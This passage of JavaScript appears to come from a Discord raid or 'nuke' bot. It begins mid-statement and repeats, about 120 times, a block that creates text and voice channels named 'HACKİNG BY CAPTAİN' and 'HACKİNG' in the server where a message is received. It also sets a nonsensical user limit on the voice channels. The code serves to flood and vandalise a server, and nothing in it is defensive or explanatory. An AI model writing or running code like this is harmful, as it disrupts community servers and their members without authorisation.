      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
